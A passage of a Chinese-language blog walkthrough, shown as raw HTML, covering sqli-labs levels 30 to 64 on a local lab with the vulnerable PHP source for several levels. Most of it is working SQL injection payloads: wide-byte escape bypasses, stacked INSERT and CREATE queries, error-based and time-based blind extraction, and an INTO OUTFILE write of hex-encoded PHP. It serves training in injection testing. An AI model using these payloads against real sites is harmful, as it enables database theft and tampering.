id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><h4 id="手动注入-31"><a href="#手动注入-31" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31 Protection with WAF</strong></h3><h4 id="手动注入-32"><a href="#手动注入-32" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路： </p><p>（1）%df 吃掉 \ 具体的原因是 urlencode(‘\) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>（2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法</p><h4 id="手动注入-33"><a href="#手动注入-33" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-32/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-30"><a href="#源码分析-30" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><h4 id="手动注入-34"><a href="#手动注入-34" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-33/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-31"><a href="#源码分析-31" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><h4 id="手动注入-35"><a href="#手动注入-35" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/sv6kSR8guHL12Dh.png" alt="34.png"></p><h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><h4 id="手动注入-36"><a href="#手动注入-36" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-35/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-32"><a href="#源码分析-32" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><h4 id="手动注入-37"><a href="#手动注入-37" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%EF%BF%BD&#x27;union <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-33"><a href="#源码分析-33" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><h4 id="手动注入-38"><a href="#手动注入-38" class="headerlink" title="手动注入"></a>手动注入</h4><p>用burp即可</p><h4 id="源码分析-34"><a href="#源码分析-34" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$passwd1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="Page-3-Stacked-Injections"><a href="#Page-3-Stacked-Injections" class="headerlink" title="Page-3  (Stacked Injections)"></a>Page-3  (Stacked Injections)</h2><h3 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 stacked Query</h3><h4 id="手动注入-39"><a href="#手动注入-39" class="headerlink" title="手动注入"></a>手动注入</h4><p>加入一条数据</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-38/?id=1&#x27;;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;38&#x27;</span>,<span class="string">&#x27;less38&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/FTXO3ltsWAHe6aS.png" alt="38.png"></p><h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><h4 id="手动注入-40"><a href="#手动注入-40" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-39/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;39&#x27;</span>,<span class="string">&#x27;less39&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><h4 id="手动注入-41"><a href="#手动注入-41" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-40/?id=1&#x27;); <span class="attribute">insert</span> into users(id,username, password) values (<span class="string">&#x27;40&#x27;</span>,<span class="string">&#x27;less40&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><h4 id="手动注入-42"><a href="#手动注入-42" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-41/?id=1;<span class="attribute">insert</span> into users(id,username,password) values (<span class="string">&#x27;41&#x27;</span>,<span class="string">&#x27;less41&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-35"><a href="#源码分析-35" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><h4 id="手动注入-43"><a href="#手动注入-43" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’;create table less42 like users–+</p><p><img src="https://s2.loli.net/2022/05/17/5ovkQSFNKgiWfdH.png" alt="42.png"></p><h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)"></a>less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</h3><h4 id="手动注入-44"><a href="#手动注入-44" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’);create table less43 like users–+</p><h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><h4 id="手动注入-45"><a href="#手动注入-45" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’;create table less44 like users–+</p><h3 id="less-45-基于报错的password处的’-闭合注入"><a href="#less-45-基于报错的password处的’-闭合注入" class="headerlink" title="less-45 基于报错的password处的’)闭合注入"></a>less-45 基于报错的password处的’)闭合注入</h3><h4 id="手动注入-46"><a href="#手动注入-46" class="headerlink" title="手动注入"></a>手动注入</h4><p><code>username</code>:admin </p><p><code>Password</code>:c’);create table less45 like users–+</p><h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><h4 id="手动注入-47"><a href="#手动注入-47" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-46/?sort=(<span class="attribute">select</span> count(*) from information_schema.columns group by concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand()*<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#也可以导入导出文件into outfile 参数</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-36"><a href="#源码分析-36" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><h4 id="手动注入-48"><a href="#手动注入-48" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/qi8F1NCMIayvPrH.png" alt="47.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-47/?sort=1&#x27;<span class="attribute">into</span> outfile <span class="string">&quot;文件地址&quot;</span>lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><h4 id="手动注入-49"><a href="#手动注入-49" class="headerlink" title="手动注入"></a>手动注入</h4><p>布尔盲注、延时注入及对文件操作均可，除不能报错注入外同Less-46</p><h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><h4 id="手动注入-50"><a href="#手动注入-50" class="headerlink" title="手动注入"></a>手动注入</h4><p>除不能报错注入外同Less-47</p><h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><h4 id="手动注入-51"><a href="#手动注入-51" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-50/?sort=1;<span class="attribute">create</span> table less50 like users</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VZUAQPF5jBvIJ8r.png" alt="50.png"></p><h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><h4 id="手动注入-52"><a href="#手动注入-52" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-51/?sort=1&#x27;;<span class="attribute">create</span> table less51 like users--+</span><br></pre></td></tr></table></figure><h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><h4 id="手动注入-53"><a href="#手动注入-53" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-52/?sort=1;<span class="attribute">create</span> table less52 like users</span><br></pre></td></tr></table></figure><h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><h4 id="手动注入-54"><a href="#手动注入-54" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-53/?sort=1&#x27;;<span class="attribute">create</span> table less53 like users--+</span><br></pre></td></tr></table></figure><h2 id="Page-4-Challenges"><a href="#Page-4-Challenges" class="headerlink" title="Page-4  (Challenges)"></a>Page-4  (Challenges)</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><h4 id="手动注入-55"><a href="#手动注入-55" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名cul94axau9</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_B27K,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;cul94axau9&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-54/index.php?id=-1&#x27;union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_B27K) from challenges.cul94axau9--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/1aoe3HdJVti8zqP.png" alt="54.png"></p><h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><h4 id="手动注入-56"><a href="#手动注入-56" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取表名k6cm9525rm</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取列名id,sessid,secret_6TMN,tryy</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;k6cm9525rm&#x27;</span>--+</span><br><span class="line"><span class="comment">#获取答案</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-55/index.php?id=-1)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(secret_6TMN) from challenges.k6cm9525rm--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/ScPXqw9oER13LjV.png" alt="55.png"></p><h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><h4 id="手动注入-57"><a href="#手动注入-57" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>(&#39;&#39;)</code>处理输入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-56/?id=-1&#x27;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-37"><a href="#源码分析-37" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><h4 id="手动注入-58"><a href="#手动注入-58" class="headerlink" title="手动注入"></a>手动注入</h4><p>本关使用<code>&quot;&quot;</code>处理输入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-57/?id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-38"><a href="#源码分析-38" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><h4 id="手动注入-59"><a href="#手动注入-59" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-58/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><h4 id="手动注入-60"><a href="#手动注入-60" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-59/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-39"><a href="#源码分析-39" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><h4 id="手动注入-61"><a href="#手动注入-61" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-60/?id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-40"><a href="#源码分析-40" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><h4 id="手动注入-62"><a href="#手动注入-62" class="headerlink" title="手动注入"></a>手动注入</h4><p>报错注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=-1&#x27;))<span class="attribute">union</span> <span class="literal">select</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),0x7e))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-41"><a href="#源码分析-41" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><h4 id="手动注入-63"><a href="#手动注入-63" class="headerlink" title="手动注入"></a>手动注入</h4><p>延时注入（可以使用脚本）</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-61/?id=1&#x27;)<span class="attribute">and</span> If(ascii(substr((<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;challenges&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,sleep(<span class="number">10</span>))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-42"><a href="#源码分析-42" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><h4 id="手动注入-64"><a href="#手动注入-64" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-43"><a href="#源码分析-43" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><h4 id="手动注入-65"><a href="#手动注入-65" class="headerlink" title="手动注入"></a>手动注入</h4><p>同Less-62，使用延时注入。</p><h4 id="源码分析-44"><a href="#源码分析-44" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td 